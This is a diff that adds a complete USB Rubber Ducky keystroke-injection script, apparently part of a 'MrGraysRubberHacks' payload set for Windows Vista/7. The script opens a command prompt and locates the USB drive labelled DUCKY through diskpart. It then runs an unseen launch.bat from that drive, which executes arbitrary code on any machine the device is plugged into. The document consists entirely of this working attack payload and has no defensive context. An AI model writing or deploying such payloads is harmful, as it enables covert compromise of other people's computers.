@@ -1,0 +1,17 @@
+DEFAULT_DELAY 25
+REM File: MrGraysRubberHacks.txt
+REM Target: WINDOWS VISTA/7
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 100
+STRING cmd
+DELAY 100
+ENTER
+DELAY 150
+STRING for /f "tokens=3 delims= " %A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%A:)
+ENTER
+STRING set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks
+ENTER
+STRING %DUCKYdrive%\launch.bat
+ENTER
